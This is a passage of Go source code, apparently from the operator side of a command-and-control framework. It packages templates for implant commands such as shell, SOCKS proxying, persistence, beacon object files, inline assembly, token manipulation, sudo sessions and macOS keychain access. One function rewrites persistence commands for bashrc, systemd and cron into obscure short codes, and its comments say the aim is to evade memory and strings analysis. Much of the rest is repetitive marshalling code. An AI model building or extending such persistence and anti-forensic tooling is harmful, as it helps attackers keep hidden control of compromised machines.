	log.Printf("Injected persistence template (%d bytes encoded)", len(encoded))
	return encoded
}

// injectShellTemplate returns base64-encoded shell template data
func injectShellTemplate() string {
	template := templates.GetShellTemplate()
	if template == nil {
		return ""
	}

	jsonData, err := template.ToJSON()
	if err != nil {
		log.Printf("Failed to serialize shell template: %v", err)
		return ""
	}

	encoded := base64.StdEncoding.EncodeToString(jsonData)
	log.Printf("Injected shell template (%d bytes encoded)", len(encoded))
	return encoded
}

// injectLinkTemplate returns base64-encoded link template data
func injectLinkTemplate() string {
	template := templates.GetLinkTemplate()
	if template == nil {
		return ""
	}

	jsonData, err := template.ToJSON()
	if err != nil {
		log.Printf("Failed to serialize link template: %v", err)
		return ""
	}

	encoded := base64.StdEncoding.EncodeToString(jsonData)
	log.Printf("Injected link template (%d bytes encoded)", len(encoded))
	return encoded
}

// mergeSocksTemplate merges the socks template into existing JSON data
// Socks data is special - it contains configuration that gets merged with the template
func mergeSocksTemplate(existingData string) string {
	if existingData == "" {
		return existingData
	}

	// Parse existing socks config
	var socksConfig map[string]interface{}
	if err := json.Unmarshal([]byte(existingData), &socksConfig); err != nil {
		log.Printf("Failed to parse existing socks data: %v", err)
		return existingData
	}

	// Get the template
	template := templates.GetSocksTemplate()
	if template == nil {
		return existingData
	}

	// Add template fields to socks config
	socksConfig["tpl"] = template.Templates
	socksConfig["v"] = template.Version
	socksConfig["t"] = template.Type

	// Re-serialize
	mergedJSON, err := json.Marshal(socksConfig)
	if err != nil {
		log.Printf("Failed to serialize merged socks data: %v", err)
		return existingData
	}

	log.Printf("Merged socks template into config (%d bytes)", len(mergedJSON))
	return string(mergedJSON)
}

// injectPsTemplate returns base64-encoded ps template data
func injectPsTemplate() string {
	template := templates.GetPsTemplate()
	if template == nil {
		return ""
	}

	jsonData, err := template.ToJSON()
	if err != nil {
		log.Printf("Failed to serialize ps template: %v", err)
		return ""
	}

	encoded := base64.StdEncoding.EncodeToString(jsonData)
	log.Printf("Injected ps template (%d bytes encoded)", len(encoded))
	return encoded
}

// injectLsTemplate returns base64-encoded ls template data
func injectLsTemplate() string {
	template := templates.GetLsTemplate()
	if template == nil {
		return ""
	}

	jsonData, err := template.ToJSON()
	if err != nil {
		log.Printf("Failed to serialize ls template: %v", err)
		return ""
	}

	encoded := base64.StdEncoding.EncodeToString(jsonData)
	log.Printf("Injected ls template (%d bytes encoded)", len(encoded))
	return encoded
}

// injectRmTemplate returns base64-encoded rm template data
func injectRmTemplate() string {
	template := templates.GetRmTemplate()
	if template == nil {
		return ""
	}

	jsonData, err := template.ToJSON()
	if err != nil {
		log.Printf("Failed to serialize rm template: %v", err)
		return ""
	}

	encoded := base64.StdEncoding.EncodeToString(jsonData)
	log.Printf("Injected rm template (%d bytes encoded)", len(encoded))
	return encoded
}

// injectHashTemplate returns base64-encoded hash template data
func injectHashTemplate() string {
	template := templates.GetHashTemplate()
	if template == nil {
		return ""
	}

	jsonData, err := template.ToJSON()
	if err != nil {
		log.Printf("Failed to serialize hash template: %v", err)
		return ""
	}

	encoded := base64.StdEncoding.EncodeToString(jsonData)
	log.Printf("Injected hash template (%d bytes encoded)", len(encoded))
	return encoded
}

// injectSudoSessTemplate returns base64-encoded sudo session template data
func injectSudoSessTemplate() string {
	template := templates.GetSudoSessTemplate()
	if template == nil {
		return ""
	}

	jsonData, err := template.ToJSON()
	if err != nil {
		log.Printf("Failed to serialize sudo-session template: %v", err)
		return ""
	}

	encoded := base64.StdEncoding.EncodeToString(jsonData)
	log.Printf("Injected sudo-session template (%d bytes encoded)", len(encoded))
	return encoded
}

// injectBOFTemplate returns base64-encoded BOF template data
func injectBOFTemplate() string {
	template := templates.GetBOFTemplate()
	if template == nil {
		return ""
	}

	jsonData, err := template.ToJSON()
	if err != nil {
		log.Printf("Failed to serialize BOF template: %v", err)
		return ""
	}

	encoded := base64.StdEncoding.EncodeToString(jsonData)
	log.Printf("Injected BOF template (%d bytes encoded)", len(encoded))
	return encoded
}

// mergeBOFTemplate merges the BOF template into existing BOF data
// BOF data may contain metadata like arch, bof bytes, arguments etc.
func mergeBOFTemplate(existingData string) string {
	if existingData == "" {
		return injectBOFTemplate()
	}

	// Try to parse existing data as JSON
	var bofConfig map[string]interface{}
	if err := json.Unmarshal([]byte(existingData), &bofConfig); err != nil {
		// Not JSON - might be raw base64 BOF data, wrap it with template
		template := templates.GetBOFTemplate()
		if template == nil {
			return existingData
		}

		// Create a wrapper with the template and original data
		wrapper := map[string]interface{}{
			"tpl":      template.Templates,
			"v":        template.Version,
			"t":        template.Type,
			"bof_data": existingData, // Preserve original BOF data
		}

		wrappedJSON, err := json.Marshal(wrapper)
		if err != nil {
			log.Printf("Failed to wrap BOF data with template: %v", err)
			return existingData
		}

		log.Printf("Wrapped BOF data with template (%d bytes)", len(wrappedJSON))
		return string(wrappedJSON)
	}

	// Get the template
	template := templates.GetBOFTemplate()
	if template == nil {
		return existingData
	}

	// Add template fields to BOF config
	bofConfig["tpl"] = template.Templates
	bofConfig["v"] = template.Version
	bofConfig["t"] = template.Type

	// Re-serialize
	mergedJSON, err := json.Marshal(bofConfig)
	if err != nil {
		log.Printf("Failed to serialize merged BOF data: %v", err)
		return existingData
	}

	log.Printf("Merged BOF template into config (%d bytes)", len(mergedJSON))
	return string(mergedJSON)
}

// transformPersistFlags transforms user-friendly persist flags and method names to short codes
// This reduces the fingerprinting surface in agent memory
func transformPersistFlags(command string) string {
	// Split command to handle method names specially
	parts := strings.Fields(command)
	if len(parts) < 2 {
		return command
	}

	// Transform method name (second word after "persist")
	// persist bashrc → persist b
	// persist systemd → persist s
	// persist cron → persist c
	// persist remove → persist r
	methodTransforms := map[string]string{
		"bashrc":  "b",
		"systemd": "s",
		"cron":    "c",
		"remove":  "r",
	}

	if newMethod, ok := methodTransforms[parts[1]]; ok {
		parts[1] = newMethod
	}

	// For "persist remove <type>", also transform the removal type
	// persist remove bashrc → persist r b
	// persist remove systemd → persist r s
	// persist remove cron → persist r c
	if len(parts) >= 3 && parts[1] == "r" {
		if newType, ok := methodTransforms[parts[2]]; ok {
			parts[2] = newType
		}
	}

	// Rejoin after method transformation
	result := strings.Join(parts, " ")

	// Flag transformations (user-friendly → obscure)
	// These short flags are less obvious in memory/strings analysis
	// Order matters: longer flags first to avoid partial matches (e.g., --files before --file)
	replacements := []struct {
		from string
		to   string
	}{
		// Payload wrapper flags (persist bashrc)
		{"--raw", "-1"},
		{"--no-nohup", "-2"},
		{"--no-silence", "-3"},
		{"--no-pgrep", "-4"},
		{"--no-sudo-check", "-5"},
		// Common flags
		{"--command", "-6"},
		{"--files", "-7"},
		{"--file", "-8"},
		{"--user", "-9"},
		{"--name", "-n"},
		{"--all", "-a"},
		// Persist-cron specific flags
		{"--method", "-m"},
		{"--interval", "-i"},
		// Cron method values (spool, crond, periodic, anacron, timer, all)
		{" spool", " sp"},
		{" crond", " cd"},
		{" periodic", " pr"},
		{" anacron", " an"},
		{" timer", " tm"},
		// " all" already short, but let's use "al" for consistency
	}

	for _, r := range replacements {
		result = strings.ReplaceAll(result, r.from, r.to)
	}

	if result != command {
		log.Printf("Transformed persist command: %s → %s", command, result)
	}

	return result
}

// injectInlineAssemblyTemplate returns base64-encoded inline assembly template data
func injectInlineAssemblyTemplate() string {
	template := templates.GetInlineAssemblyTemplate()
	if template == nil {
		return ""
	}

	jsonData, err := template.ToJSON()
	if err != nil {
		log.Printf("Failed to serialize inline-assembly template: %v", err)
		return ""
	}

	encoded := base64.StdEncoding.EncodeToString(jsonData)
	log.Printf("Injected inline-assembly template (%d bytes encoded)", len(encoded))
	return encoded
}

// mergeInlineAssemblyTemplate merges the inline assembly template into existing data
func mergeInlineAssemblyTemplate(existingData string) string {
	if existingData == "" {
		return injectInlineAssemblyTemplate()
	}

	// Try to parse existing data as JSON
	var iaConfig map[string]interface{}
	if err := json.Unmarshal([]byte(existingData), &iaConfig); err != nil {
		// Not JSON - wrap it with template
		template := templates.GetInlineAssemblyTemplate()
		if template == nil {
			return existingData
		}

		wrapper := map[string]interface{}{
			"tpl":     template.Templates,
			"v":       template.Version,
			"t":       template.Type,
			"ia_data": existingData,
		}

		wrappedJSON, err := json.Marshal(wrapper)
		if err != nil {
			log.Printf("Failed to wrap inline-assembly data with template: %v", err)
			return existingData
		}

		log.Printf("Wrapped inline-assembly data with template (%d bytes)", len(wrappedJSON))
		return string(wrappedJSON)
	}

	// Get the template
	template := templates.GetInlineAssemblyTemplate()
	if template == nil {
		return existingData
	}

	// Add template fields to config
	iaConfig["tpl"] = template.Templates
	iaConfig["v"] = template.Version
	iaConfig["t"] = template.Type

	// Re-serialize
	mergedJSON, err := json.Marshal(iaConfig)
	if err != nil {
		log.Printf("Failed to serialize merged inline-assembly data: %v", err)
		return existingData
	}

	log.Printf("Merged inline-assembly template into config (%d bytes)", len(mergedJSON))
	return string(mergedJSON)
}

// injectTokenTemplate returns base64-encoded token template data
func injectTokenTemplate() string {
	template := templates.GetTokenTemplate()
	if template == nil {
		return ""
	}

	jsonData, err := template.ToJSON()
	if err != nil {
		log.Printf("Failed to serialize token template: %v", err)
		return ""
	}

	encoded := base64.StdEncoding.EncodeToString(jsonData)
	log.Printf("Injected token template (%d bytes encoded)", len(encoded))
	return encoded
}

// injectRev2SelfTemplate returns base64-encoded rev2self template data
func injectRev2SelfTemplate() string {
	template := templates.GetRev2SelfTemplate()
	if template == nil {
		return ""
	}

	jsonData, err := template.ToJSON()
	if err != nil {
		log.Printf("Failed to serialize rev2self template: %v", err)
		return ""
	}

	encoded := base64.StdEncoding.EncodeToString(jsonData)
	log.Printf("Injected rev2self template (%d bytes encoded)", len(encoded))
	return encoded
}

// injectDownloadTemplate returns base64-encoded download template data
func injectDownloadTemplate() string {
	template := templates.GetDownloadTemplate()
	if template == nil {
		return ""
	}

	jsonData, err := template.ToJSON()
	if err != nil {
		log.Printf("Failed to serialize download template: %v", err)
		return ""
	}

	encoded := base64.StdEncoding.EncodeToString(jsonData)
	log.Printf("Injected download template (%d bytes encoded)", len(encoded))
	return encoded
}

// injectWhoamiTemplate returns base64-encoded whoami template data
func injectWhoamiTemplate() string {
	template := templates.GetWhoamiTemplate()
	if template == nil {
		return ""
	}

	jsonData, err := template.ToJSON()
	if err != nil {
		log.Printf("Failed to serialize whoami template: %v", err)
		return ""
	}

	encoded := base64.StdEncoding.EncodeToString(jsonData)
	log.Printf("Injected whoami template (%d bytes encoded)", len(encoded))
	return encoded
}

// injectKeychainTemplate returns base64-encoded keychain template data (Darwin only)
func injectKeychainTemplate() string {
	template := templates.GetKeychainTemplate()
	if template == nil {
		return ""
	}

	jsonData, err := template.ToJSON()
	if err != nil {
		log.Printf("Failed to serialize keychain template: %v", err)
		return ""
	}

	encoded := base64.StdEncoding.EncodeToString(jsonData)
	log.Printf("Injected keychain template (%d bytes encoded)", len(encoded))
	return encoded
}
